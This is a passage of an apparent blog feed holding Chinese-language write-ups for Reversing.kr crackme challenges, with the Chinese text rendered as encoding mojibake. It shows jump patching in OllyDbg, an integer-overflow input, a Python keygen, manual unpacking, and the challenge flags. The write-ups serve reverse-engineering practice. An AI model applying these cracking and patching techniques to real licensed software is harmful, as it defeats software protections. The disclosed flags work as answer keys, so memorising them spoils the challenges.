                ><br>è¿™é‡Œä¹Ÿèƒ½çœ‹åˆ°è°ƒç”¨è€…çš„ä¿¡æ¯ã€‚<br>åŒå‡»è°ƒç”¨è€…çš„åœ°å€ï¼Œåœ¨åæ±‡ç¼–çª—å£ä¸­è½¬åˆ°å…³é”®å‡½æ•°ï¼Œè¿™æ—¶æœ‰ä¸¤ç§åŠæ³•ï¼Œå…¶ä¸€å°±æ˜¯å®šä½åˆ°å‡½æ•°å¼€å¤´(push ebpã€mov ebp,esp â€¦)ä¸‹æ–­ç‚¹ï¼Œç„¶åå•æ­¥å¼„æ¸…ç¨‹åºé€»è¾‘ï¼Œå¦ä¸€ç§çš„æ€è·¯æ˜¯ï¼šç”±äºæˆ‘ä»¬å·²ç»æ‰¾åˆ°å…³é”®å‡½æ•°çš„åœ°å€ï¼Œæ‰€ä»¥å¯ä»¥åœ¨IDAä¸­æ‰¾åˆ°å¯¹åº”ä½ç½®ï¼Œç„¶åå°è¯•åç¼–è¯‘å‡ºä¼ªä»£ç ä»¥å‡å°‘å·¥ä½œé‡ã€‚<br>æˆ‘ä»¬ç›´æ¥ä½¿ç”¨IDAè½½å…¥ï¼Œæ‰¾åˆ°åœ°å€ä¸º <strong>0x004044C0</strong> çš„ä½ç½®ï¼Œåœ¨è¿™ä¸ªåœ°å€ä¸ŠæŒ‰ä¸‹ P é”®ï¼Œå†ä½¿ç”¨ F5 å°±å¯ä»¥çœ‹åˆ°ä¼ªä»£ç äº†ã€‚<br>å‡½æ•°å¾ˆé•¿ï¼Œæˆªä¸€éƒ¨åˆ†ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-7.png"
                      alt="image"
                ></p>
<p>å¾ˆå®¹æ˜“å°±èƒ½å¤Ÿæƒ³åˆ°ï¼Œå˜é‡ v35 æ‰€å­˜å‚¨çš„åº”è¯¥å°±æ˜¯å·²ç»æ’­æ”¾çš„æ—¶é—´ï¼Œä¾æ®å°±æ˜¯ä»£ç å°† v35 ä¸ 60000 ä»¥åŠä¸‹é¢çš„ 60010 è¿›è¡Œæ¯”è¾ƒï¼Œåœ¨ VB ä¸­ï¼Œè®¡æ—¶å™¨æœ‰å…³çš„æ—¶é—´(ç§’æ•°)ä¼šæ”¾å¤§ 1000 å€ï¼Œè¿™é‡Œçš„ 60000 æ‰€å¯¹åº”çš„åº”è¯¥å°±æ˜¯ 60 ç§’äº†ã€‚<br>å¯¹ç…§ç€ä¼ªä»£ç ï¼Œæ•´ç†å‡ºç¨‹åºçš„é€»è¾‘ï¼Œä¸åœåœ°(åº”è¯¥æ˜¯1ç§’ä¸€æ¬¡ï¼Œå¯ä»¥åœ¨ VBExplore ä¸­çœ‹è®¡æ—¶å™¨çš„å±æ€§)å°†å·²ç»æ’­æ”¾çš„æ—¶é—´å’Œ 60000 æ¯”è¾ƒï¼Œå¦‚æœå°äºå°±æ‰§è¡Œä¸€äº›æ“ä½œï¼Œå¦‚æœå¤§äºæˆ–ç­‰äºï¼Œå°±å¼¹çª—ã€‚<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-8.png"
                      alt="image"
                ></p>
<p>å½“æ—¶é—´æ²¡æœ‰è¶…è¿‡ 60 ç§’æ—¶ï¼Œæœ‰ä¸€å¤„åˆ¤æ–­ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-9.png"
                      alt="image"
                ></p>
<p>å¦‚æœè¿è¡Œåˆ°è¿™é‡Œï¼Œåº”è¯¥å°±ä¼šæ‹¿åˆ° flag äº†ï¼Œé‚£ä¹ˆç›´æ¥æš´åŠ›ä¸€æ³¢ï¼Œåœ¨ OD ä¸­åšå¦‚ä¸‹ä¿®æ”¹ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-10.png"
                      alt="image"
                ><br>æ”¹ä¸ºï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-11.png"
                      alt="image"
                ></p>
<p>å†æ¬¡è¿è¡Œç¨‹åº(æç¤ºï¼š<strong>å¯ä»¥å°†ä¿®æ”¹ä¿å­˜åˆ°ç¨‹åºï¼Œæ–¹ä¾¿æ“ä½œ</strong>)ï¼Œå½“æ’­æ”¾åˆ°1åˆ†é’Ÿæ—¶ï¼Œä¼šå¼¹å‡ºè¿™æ ·çš„å¯¹è¯æ¡†ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-12.png"
                      alt="image"
                ></p>
<p>éŸ³é¢‘è¿˜åœ¨ç»§ç»­æ’­æ”¾ï¼Œä½†æ˜¯ç‚¹å‡»ç¡®å®šä¹‹åç¨‹åºä¼šé€€å‡ºï¼Œè€Œä¸”ä¹Ÿæ²¡æœ‰ flag å‡ºæ¥ï¼Œç™¾åº¦ä¸€ä¸‹å¯ä»¥æ‰¾åˆ°å…³äºè¿™ä¸ªé”™è¯¯çš„ä¿¡æ¯ï¼Œä¸€èˆ¬æ˜¯æ§ä»¶çš„å±æ€§è®¾ç½®å‡ºé”™å¯¼è‡´çš„ï¼Œä¹Ÿè®¸ä½ æƒ³å°è¯•æ•è·è¿™ä¸ªå¯¹è¯æ¡†ï¼Œä½†æ˜¯æ— è®ºæ–­ rtcMsgBox è¿˜æ˜¯ __vbaNew2 éƒ½æ²¡æœ‰ç”¨å¤„ï¼ŒOD æ²¡æœ‰æ•è·åˆ°è¿™ä¸¤ä¸ªæ–­ç‚¹ï¼Œä»”ç»†æ€è€ƒä¸€ä¸‹ï¼Œå¯¹è¯æ¡†å¼¹å‡ºåéŸ³é¢‘å´æ²¡æœ‰é—´æ–­ï¼Œé‚£ä¹ˆæ˜¾ç„¶è¿™ä¸ªå¯¹è¯æ¡†æ§åˆ¶æƒå¹¶ä¸åœ¨æœ¬ç¨‹åºï¼Œè€Œæ˜¯åœ¨å…¶ä»–ä½ç½®ï¼Œå…¶å®ï¼Œè¿™æ˜¯ä¸€ä¸ªç³»ç»Ÿæ‰€æŠ›å‡ºçš„å¼‚å¸¸ï¼Œå®ƒä½äº kernel32.dll ä¸­ï¼Œæƒ³è¦æ•è·åˆ°è¿™ä¸ªçª—å£ï¼Œéœ€è¦äº†è§£ä¸€ä¸‹ windows å¼‚å¸¸å¤„ç†æœºåˆ¶(è¿™é‡Œä¸è¯¦ç»†ä»‹ç»)ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç³»ç»Ÿå‡½æ•° <strong>RaiseException</strong> ä¸‹æ–­ç‚¹ï¼Œåˆ©ç”¨å‘½ä»¤ <strong>bp RaiseException</strong> å³å¯ã€‚<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-13.png"
                      alt="image"
                ></p>
<p>åœ¨æ–­ç‚¹çª—å£ä¸­çœ‹åˆ°æ–°çš„æ–­ç‚¹ä½äº kernel32.dll ä¸­ï¼Œä¸‹å¥½æ–­ç‚¹ F9 å¼€å§‹æ‰§è¡Œç¨‹åºï¼Œå½“æ’­æ”¾æ—¶é—´æ»¡ 1 åˆ†é’Ÿæ—¶ï¼Œä¼šæ–­åœ¨è¿™ä¸ªæ–­ç‚¹ï¼Œæ‰“å¼€è°ƒç”¨å †æ ˆçª—å£ï¼Œå°±èƒ½æ‰¾åˆ°ç¨‹åºä¸­è°ƒç”¨è€…çš„ä¿¡æ¯ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-14.png"
                      alt="image"
                ></p>
<p>å®šä½åˆ°è¿™å—ä»£ç ï¼Œæ‰¾åˆ°äº†è§¦å‘å¼‚å¸¸çš„å‡½æ•° <strong>__vbaHresultCheckObj</strong> ï¼Œå…³äºè¿™ä¸ªå‡½æ•°çš„å…·ä½“ä¿¡æ¯å¯ä»¥åœ¨ç™¾åº¦ä¸Šæ‰¾åˆ°ï¼Œå®ƒçš„ç”¨é€”æ˜¯æ£€æŸ¥æŸä¸ªå¯¹è±¡(åº”è¯¥æ˜¯VBçš„ç‰¹æœ‰å‡½æ•°ï¼Ÿ)ï¼Œæˆ‘ä»¬ä¹‹å‰çš„ä¿®æ”¹å¯èƒ½é€ æˆäº†æŸä¸ªå¯¹è±¡çš„å±æ€§å‡ºé”™ï¼Œä½¿å¾—è¿™ä¸ªå‡½æ•°ä¸èƒ½æ­£å¸¸å·¥ä½œï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°ä¸Šæ–¹æ­£å¥½æœ‰ä¸€å¤„è·³è½¬ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-15.png"
                      alt="image"
                ></p>
<p>å¯ä»¥å°†å®ƒæ”¹ä¸ºæ— æ¡ä»¶è·³è½¬(åŸæ¥ä¸º å¤§äºæˆ–ç­‰äº åˆ™è·³è½¬)ï¼š <strong>jmp short 004046BF</strong><br>ç„¶åå°†ä¿®æ”¹ä¿å­˜åˆ°æ–‡ä»¶ï¼Œå†æ¬¡è¿è¡Œï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr4-16.png"
                      alt="image"
                ></p>
<p>é¡ºåˆ©æ‹¿åˆ° flag ï¼š <strong>LIstenCare</strong></p>
<h2 id="05-Replace"><a href="#05-Replace" class="headerlink" title="05 Replace"></a>05 Replace</h2><p>ç¬¬äº”é¢˜æ˜¯ä¸€é“ç»å…¸çš„ è¾“å…¥-éªŒè¯ ç±»å‹é¢˜ç›®ï¼Œæ‰“å¼€ç¨‹åºï¼Œè¦æ±‚è¾“å…¥ä¸€äº›å†…å®¹ï¼Œç„¶åè¿›è¡Œ checkï¼Œéšä¾¿è¾“å…¥ä¸€äº›å†…å®¹(<strong>è¾“å…¥çš„æ—¶å€™å‘ç°ï¼Œåªèƒ½è¾“å…¥æ•°å­—</strong>)ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr5-1.png"
                      alt="image"
                ><br>ç¨‹åºç›´æ¥å´©æºƒäº†ï¼Œè¿™ä¸ªéªŒè¯çš„è¿‡ç¨‹åº”è¯¥ä¸ä¼šå¾ˆç®€å•ï¼Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨IDAæ‰“å¼€ç¨‹åºï¼Œé€šè¿‡æœç´¢å­—ç¬¦ä¸²çš„æ–¹å¼å®šä½å…³é”®å‡½æ•°ï¼Œç›´æ¥å®šä½åˆ°äº†å‡½æ•° <strong>DialogFunc</strong>ï¼Œåç¼–è¯‘åæŸ¥çœ‹ä¼ªä»£ç ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr5-2.png"
                      alt="image"
                ></p>
<p>ä»£ç æ¯”è¾ƒå¥‡æ€ªï¼Œåç¼–è¯‘çš„ä¼¼ä¹ä¸å¤ªæ­£ç¡®ï¼Œå¾ˆå¤šå‡½æ•°æ— æ³•åç¼–è¯‘ï¼Œè€Œä¸” IDA ä¹Ÿæç¤ºæˆ‘ä»¬è¾“å‡ºçš„ç»“æœå¯èƒ½æ˜¯é”™è¯¯çš„ï¼Œé™æ€åˆ†ææš‚æ—¶æ²¡æœ‰ä»€ä¹ˆå¥½åŠæ³•ï¼Œé‚£ä¹ˆæ‰“å¼€ OD å°è¯•åŠ¨æ€åˆ†æã€‚<br>ä¾æ—§æ˜¯å…ˆåœ¨å…³é”®å‡½æ•°ä¸‹æ–­ç‚¹(æˆ‘ä»¬åœ¨ <strong>GetDlgItemInt</strong> ä¸Šé¢ä¸‹æ–­)ï¼Œç„¶å F9 è¿è¡Œç¨‹åºï¼Œåœ¨éšæ„è¾“å…¥ä¸€äº›æ•°å­—åï¼Œç‚¹å‡»checkæŒ‰é’®ï¼Œç¨‹åºè§¦å‘æ–­ç‚¹ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr5-3.png"
                      alt="image"
                ></p>
<p>æ­¥è¿‡è¿™ä¸ªç³»ç»Ÿå‡½æ•°ä¹‹åå‘ç° EAX ä¸­å­˜å‚¨çš„å€¼ä¸ºæˆ‘ä»¬è¾“å…¥æ•°å­—çš„åå…­è¿›åˆ¶ï¼Œä¾‹å¦‚è¾“å…¥ 12345ï¼ŒEAXä¸­çš„å€¼å°±æ˜¯ 0x3039ã€‚</p>
<p>å•æ­¥ç¨‹åºï¼Œå½“å•æ­¥è·Ÿè¸ªåˆ°è¿™é‡Œï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr5-4.png"
                      alt="image"
                ></p>
<p>æœ‰ä¸€å¥å¥‡æ€ªçš„æŒ‡ä»¤ db 81 ï¼ŒæŸ¥è¯¢ INTEL æ‰‹å†Œå¹¶æ²¡æœ‰å‘ç° 0x81 å¯¹åº”ç€ä»€ä¹ˆæŒ‡ä»¤ï¼ŒçŒœæµ‹è¿™ä¸ªå­—èŠ‚æ˜¯å¤šä½™çš„ï¼Œå³é”®è¿™å¥ä»£ç  â€“&gt; åˆ†æ â€“&gt; ä»æ¨¡å—åˆ é™¤åˆ†æï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr5-5.png"
                      alt="image"
                ></p>
<p>ä»£ç å°±ä¼šå˜æˆè¿™æ ·ï¼Œçœ‹ä¸Šå»æ¯”åŸæ¥å¥½ä¸€äº›(ä¸‹é¢çš„ pushad ä»¥åŠ popad ç›¸å½“äºæ²¡æœ‰æ‰§è¡Œä»»ä½•æ“ä½œ)ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr5-6.png"
                      alt="image"
                ></p>
<p>é€šè¿‡å•æ­¥æ•´ç†é€»è¾‘ï¼Œ0x4084D0 ä¸­å­˜å‚¨çš„æ˜¯æˆ‘ä»¬è¾“å…¥çš„æ•°å­— + 2ï¼Œè¿™é‡Œå†åŠ ä¸Š 0x601605C7 ï¼Œç»§ç»­å•æ­¥ï¼ŒåˆåŠ äº†2ï¼Œé‚£ä¹ˆæœ€å 0x4084D0 ä¸­æ‰€å­˜å‚¨çš„å°±æ˜¯ <strong>è¾“å…¥ + 4 + 0x601605C7</strong>ã€‚<br>éšåç¨‹åºæ‰§è¡Œåˆ°äº†è¿™é‡Œï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr5-7.png"
                      alt="image"
                ></p>
<p>ä¸¤æ¡ JMP ï¼Œç´§è·Ÿçš„å°±æ˜¯å­—ç¬¦ä¸² correct ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœæ²¡æœ‰å¦ä¸€å¤„è·³è½¬èƒ½å¤Ÿç›´æ¥è½¬åˆ° 0x401073 çš„è¯ï¼Œæ˜¯æ°¸è¿œä¸å¯èƒ½å‡ºç° correct æç¤ºçš„ï¼Œæ¥ç€å•æ­¥ç¨‹åºï¼Œæ¥åˆ°è¿™æ®µä»£ç ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr5-8.png"
                      alt="image"
                ></p>
<p>åŠ¨æ€åœ¨ 0x40466F ç”Ÿæˆäº†ä¸€æ¡ä»£ç ï¼Œå¹¶å°†æ‰§è¡Œæµåˆ‡æ¢åˆ°é‚£é‡Œ(æœŸé—´è¿˜ä¼šå¯¹ 0x4084D0 è¿›è¡Œå‡ æ¬¡è‡ªå¢ï¼Œä½†æ˜¯åœ¨è‡ªå¢å‰å·²ç»å°†å…¶ä¸­çš„å€¼å–å‡ºåˆ° EAX ä¸­äº†ï¼Œæ‰€ä»¥å¹¶ä¸å¹²æ‰°è®¡ç®—)ã€‚<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr5-9.png"
                      alt="image"
                ></p>
<p>å°† 0x90 èµ‹å€¼ç»™ EAX å¯¹åº”çš„åœ°å€ï¼Œè€Œæ­¤æ—¶ EAX ä¸­çš„å€¼å°±æ˜¯ä¸Šé¢ç»è¿‡å¤„ç†çš„è¾“å…¥ï¼Œæ ¹æ® INTEL æ‰‹å†Œï¼Œ0X90 æ‰€å¯¹åº”çš„æŒ‡ä»¤ä¸º nop ï¼Œæ€è·¯æ¯”è¾ƒæ˜æ˜¾ï¼Œå¦‚æœèƒ½ä½¿è¿™é‡Œçš„ EAX çš„å€¼ä¸º <strong>0x401071</strong> ï¼Œé‚£ä¹ˆå°±èƒ½å°†é‚£ä¸¤æ¡ JMP ä¸­çš„ç¬¬äºŒæ¡å»æ‰ï¼Œä»è€Œä½¿ç¨‹åºè¾“å‡º correctã€‚<br>ä¸è¿‡æˆ‘ä»¬çš„è¾“å…¥ä¼šç»è¿‡åŠ æ³•å¤„ç†ï¼Œç»è¿‡å¤„ç†çš„æ•°æ®å·²ç»å¾ˆå¤§äº†ï¼Œå¹¶ä¸èƒ½è¾¾åˆ°ç›®æ ‡åœ°å€ï¼Œè¿™é‡Œåˆ©ç”¨æ•´æ•°æº¢å‡ºï¼Œè¾“å…¥ä¸€ä¸ªå¾ˆå¤§çš„æ•´æ•°ï¼Œä½¿æ‰§è¡ŒåŠ æ³•çš„æ—¶å€™äº§ç”Ÿæº¢å‡ºï¼Œè¾¾åˆ°ç†æƒ³çš„åœ°å€ã€‚<br>äºæ˜¯æˆ‘ä»¬éœ€è¦æ»¡è¶³ç®—å¼ï¼š <strong>input + 0x601605C7 + 4 &#x3D; 0x401071</strong><br>ä½¿ç”¨è®¡ç®—å™¨è®¡ç®—ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr5-10.png"
                      alt="image"
                ></p>
<p>ç”±äºæ˜¯ INT å‹æ•°æ®ï¼Œæ‰€ä»¥åªå–å4ä¸ªå­—èŠ‚ å³ 0xA02A0AA6,è½¬æ¢æˆåè¿›åˆ¶å°±æ˜¯ 2687109798ï¼Œè¾“å…¥ç¨‹åºï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr5-11.png"
                      alt="image"
                ></p>
<p>flagï¼š<strong>2687109798</strong></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>Reversing.kr 1-3</title>
    <url>/2018/09/02/reversingkr1-3/</url>
    <content><![CDATA[<p>Reversing.kr ä¸Šé¢çš„é¢˜ç›®ã€‚</p>
<span id="more"></span>

<h2 id="01-Easy-Crack"><a href="#01-Easy-Crack" class="headerlink" title="01 Easy Crack"></a>01 Easy Crack</h2><p>åŸºç¡€é¢˜ï¼Œä¸éœ€è¦åŠ¨æ€åˆ†æï¼Œç›´æ¥ä¸¢åˆ°IDAä¸­ï¼ŒShift+F12æœç´¢å­—ç¬¦ä¸²ï¼Œå‘ç°æœ‰ â€œCongratulation !!â€ ä»¥åŠ â€œIncorrect Passwordâ€ çš„å­—æ ·ï¼Œå®šä½åˆ°ç›¸å…³å‡½æ•°ï¼Œå°±èƒ½çœ‹åˆ°å¤„ç†é€»è¾‘ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr1-1.png"
                      alt="image"
                ></p>
<p>è¯»å–è¾“å…¥ç›´æ¥å’Œç¡¬ç¼–ç çš„flagè¿›è¡Œæ¯”è¾ƒï¼Œå”¯ä¸€çš„å‘ç‚¹åœ¨äºæ¯”è¾ƒçš„é¡ºåºï¼Œç»†å¿ƒè§‚å¯Ÿå‘ç°ï¼Œå˜é‡v3 v4 v5 ä»¥åŠstring å…¶å®åº”è¯¥æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä½†æ˜¯IDAé”™è¯¯çš„å°†å…¶è§£æä¸ºäº†charå‹å˜é‡ï¼Œæˆ‘ä»¬<strong>å•æœºstringï¼Œå¹¶æŒ‰ä¸‹Yé”®</strong>ï¼Œä¿®æ”¹å˜é‡ç±»å‹ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr1-2.png"
                      alt="image"
                ></p>
<p>å†æ¥çœ‹å°±æ¸…æ™°å¤šäº†ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr1-3.png"
                      alt="image"
                ></p>
<p>é‚£ä¹ˆflagå°±æ˜¯ï¼š <strong>Ea5yR3versing</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr1-4.png"
                      alt="image"
                ></p>
<p>æµ‹è¯•æˆåŠŸã€‚</p>
<h2 id="02-Easy-Keygen"><a href="#02-Easy-Keygen" class="headerlink" title="02 Easy Keygen"></a>02 Easy Keygen</h2><p>ç®€å•çš„æ³¨å†Œæœºç¼–å†™ï¼Œä¾æ—§æ— éœ€åŠ¨æ€è°ƒè¯•ï¼Œç›´æ¥ä¸¢åˆ°IDAä¸­çœ‹ï¼Œè€æ–¹æ³•ï¼Œå°†ä¸»å‡½æ•°çš„å˜é‡è¿›è¡Œä¿®å¤ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr2-1.png"
                      alt="image"
                ></p>
<p>æ ¹æ®é€»è¾‘æ•´ç†å‡ºæ³¨å†Œæœºï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># python2.7</span><br><span class="line">from __future__ import print_function</span><br><span class="line">name = raw_input(&quot;please input a name:&quot;)</span><br><span class="line">token = [0x10,0x20,0x30]</span><br><span class="line">index = 0</span><br><span class="line">for i in name:</span><br><span class="line">    if index &gt;= 3:</span><br><span class="line">        index = 0</span><br><span class="line">    print(&quot;%02X&quot; % (ord(i) ^ token[index]) ,end=&quot;&quot;)</span><br><span class="line">    index += 1</span><br></pre></td></tr></table></figure></div>
<p>è¿è¡Œä»£ç å°±èƒ½è®¡ç®—ä»»æ„ç”¨æˆ·åçš„æ³¨å†Œç ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr2-2.png"
                      alt="image"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr2-3.png"
                      alt="image"
                ></p>
<p>ä½†æ˜¯é¢˜ç›®è¦æ±‚æˆ‘ä»¬æ‰¾åˆ°æ³¨å†Œç ä¸º **â€œ5B134977135E7D13â€ **çš„ç”¨æˆ·åï¼Œæš´åŠ›ç ´è§£å³å¯ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in range(0,256):</span><br><span class="line">    if i ^ 0x10 == 0x5B:</span><br><span class="line">        print(&quot;%c&quot; % i)</span><br><span class="line">for i in range(0,256):</span><br><span class="line">    if i ^ 0x20 == 0x13:</span><br><span class="line">        print(&quot;%c&quot; % i)</span><br><span class="line">for i in range(0,256):</span><br><span class="line">    if i ^ 0x30 == 0x49:</span><br><span class="line">        print(&quot;%c&quot; % i)</span><br><span class="line">for i in range(0,256):</span><br><span class="line">    if i ^ 0x10 == 0x77:</span><br><span class="line">        print(&quot;%c&quot; % i)</span><br><span class="line">for i in range(0,256):</span><br><span class="line">    if i ^ 0x20 == 0x13:</span><br><span class="line">        print(&quot;%c&quot; % i)</span><br><span class="line">for i in range(0,256):</span><br><span class="line">    if i ^ 0x30 == 0x5E:</span><br><span class="line">        print(&quot;%c&quot; % i)</span><br><span class="line">for i in range(0,256):</span><br><span class="line">    if i ^ 0x10 == 0x7D:</span><br><span class="line">        print(&quot;%c&quot; % i)</span><br><span class="line">for i in range(0,256):</span><br><span class="line">    if i ^ 0x20 == 0x13:</span><br><span class="line">        print(&quot;%c&quot; % i)</span><br></pre></td></tr></table></figure></div>
<p>flagï¼š <strong>K3yg3nm3</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr2-4.png"
                      alt="image"
                ></p>
<h1 id="03-Easy-Unpack"><a href="#03-Easy-Unpack" class="headerlink" title="03 Easy Unpack"></a>03 Easy Unpack</h1><p>ç¬¬ä¸‰é¢˜ç¨å¾®å¢åŠ äº†ä¸€äº›éš¾åº¦ï¼Œæ˜¯ä¸€é“åŠ äº†å£³çš„é¢˜ç›®ï¼Œè¦æ±‚æ‰¾åˆ°ç¨‹åºçš„OEP(åŸå§‹å…¥å£ç‚¹)ï¼ŒIDAç›´æ¥æ‰“å¼€ä¼šæŠ¥è¿™ä¸ªé”™è¯¯ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr3-1.png"
                      alt="image"
                ></p>
<p>æç¤ºæˆ‘ä»¬ç¨‹åºå¯èƒ½è¢«åŠ å£³æˆ–ä¿®æ”¹ï¼Œè¿™æ—¶ï¼Œå¸¸è§„çš„æ“ä½œå°±ä¸å¤Ÿäº†ï¼Œæˆ‘ä»¬æå‡º PEIDæ¥æŸ¥ä¸€ä¸‹ç¨‹åºå¯èƒ½åŠ äº†ä»€ä¹ˆå£³ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr3-2.png"
                      alt="image"
                ></p>
<p>å¾ˆé—æ†¾ï¼Œç¨‹åºæ‰€åŠ çš„å£³å¹¶ä¸æ˜¯å·²çŸ¥çš„å£³ï¼Œä½†æ˜¯è¿™ä¸å¦¨ç¢æˆ‘ä»¬å»å°è¯•è„±å£³ï¼ŒODè½½å…¥ç¨‹åºï¼Œè¿™é‡Œé‡‡ç”¨ â€œå•æ­¥è·Ÿè¸ªæ³•â€ è¿›è¡Œè„±å£³(è¯¦ç»†è¯·ç™¾åº¦äº†è§£)ï¼Œé‡åˆ°å‘ä¸Šçš„è·³è½¬å°±ä½¿ç”¨F4è¿è¡Œåˆ°ä¸‹ä¸€å¥ä»£ç ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªé•¿è·³è½¬(æˆ–ç§°è¿œè·³è½¬)ï¼ŒåŸºæœ¬å°±æ‰¾åˆ°äº†OEPï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr3-3.png"
                      alt="image"
                ></p>
<p>åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°å¾ˆæ˜æ˜¾çš„é•¿è·³è½¬ï¼Œé‚£ä¹ˆ OEP å¯èƒ½å°±æ˜¯ <strong>00401150</strong><br>å°è¯•æäº¤ï¼Œç»“æœæ­£ç¡®ã€‚</p>
<p>æ‹“å±•ï¼š<strong>å°è¯•è„±æ‰è¿™ä¸ªæœªçŸ¥çš„å£³ã€‚</strong>  </p>
<p><em>è¯·åœ¨WIN XP æˆ–è€… WIN 7 è„±å£³</em></p>
<p>ç”±äºè¿™ä¸ªå£³çœ‹ä¸Šå»å¹¶ä¸å¤æ‚ï¼Œåº”è¯¥å¯ä»¥è„±æ‰ï¼ŒæŒ‰ç…§ä»¥ä¸‹æ­¥éª¤æ“ä½œï¼š  </p>
<ol>
<li>åœ¨ODä¸­è¿è¡Œåˆ° OEP å¤„ã€‚</li>
<li>æ‰“å¼€ LordPE ï¼Œå°è¯•è½¬å‚¨ç¨‹åºé•œåƒï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr3-4.png"
                      alt="image"
                ><br>æ³¨æ„ï¼Œ<strong>è¦å…ˆä¿®æ­£é•œåƒå¤§å°ï¼</strong>å³ä½¿æœ‰äº›æ—¶å€™ä¿®å¤å‰åçš„ç¨‹åºå¹¶æ²¡æœ‰å˜åŒ–ã€‚</li>
<li>æ‰“å¼€ Import REC ,å°è¯•ä¿®å¤ç¨‹åºçš„ IATï¼š</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/reversingkr3-5.png"
                      alt="image"
                ><br>è¿™é‡Œè¦é™„åŠ åˆ°è¿˜åœ¨ODä¸­å¤„äºè°ƒè¯•çŠ¶æ€çš„ç›®æ ‡ç¨‹åºï¼Œç„¶åæ‰‹åŠ¨ä¿®æ­£OEPã€‚<br>  <strong>æ³¨æ„ï¼šä¸èƒ½ç›´æ¥å¡«å†™OEPï¼Œå¦‚ 00401150ï¼Œè€Œæ˜¯è¦å°†OEPå‡å» 00400000(ä¸€èˆ¬æ¥è¯´)ï¼Œå› ä¸ºè¿™é‡Œéœ€è¦å¡«å†™çš„å…¶å®æ˜¯ RVAï¼Œä½†æ˜¯ODä¸­çœ‹åˆ°çš„æ˜¯ VAï¼ŒRVAå³ ç›¸å¯¹è™šæ‹Ÿåœ°å€ï¼ŒVAå³è™šæ‹Ÿåœ°å€ï¼Œä»–ä»¬ä¸PEç»“æ„æœ‰å…³ï¼Œæœ‰å…´è¶£å¯ä»¥è¯¦ç»†äº†è§£ã€‚</strong><br>å†ç‚¹å‡»IATè‡ªåŠ¨æœç´¢ï¼Œå°±èƒ½å¤Ÿæ‰¾åˆ°ç¨‹åºè°ƒç”¨çš„DLLï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯éœ€è¦å°†æ— æ•ˆæŒ‡é’ˆ(å›¾ä¸­æ˜¾ç¤º<strong>å¦</strong>çš„)åˆ é™¤æˆ–æ‰‹åŠ¨ä¿®å¤ï¼Œä½†æ˜¯æœ¬ä¾‹ä¸­è§‚å¯Ÿæ— æ•ˆæŒ‡é’ˆå‘ç°ï¼Œå®ƒä»¬éƒ½æ˜¯çœŸå®å­˜åœ¨çš„ï¼Œæ‰€ä»¥ä¸éœ€è¦è¿›è¡Œå¤šä½™æ“ä½œï¼Œç›´æ¥ä¿®æ­£è½¬å‚¨å³å¯ï¼Œåœ¨å¯¼å‡ºæ–‡ä»¶æ—¶é€‰æ‹©ç¬¬äºŒæ­¥ dump 